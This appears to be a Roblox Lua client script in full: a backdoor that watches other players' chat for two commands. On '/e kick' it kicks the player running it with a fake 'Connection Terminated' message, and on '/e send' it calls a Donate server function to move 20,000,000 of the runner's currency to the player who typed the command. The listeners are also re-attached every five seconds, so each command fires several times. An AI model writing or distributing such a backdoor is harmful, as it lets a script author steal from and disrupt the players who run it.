local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

while wait(5) do
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                if msg == "/e kick" then
                    LocalPlayer:Kick("Connection Terminated From Server: [Request From " .. player.Name .. "]")
                end
                if msg == "/e send" then
                    print("sending money to "..player.Name)
                    game:GetService("ReplicatedStorage").Transactions.ClientToServer.Donate:InvokeServer(player.Name, 20000000, LocalPlayer.CurrentSaveSlot)
                end
            end)
        end
    end
end
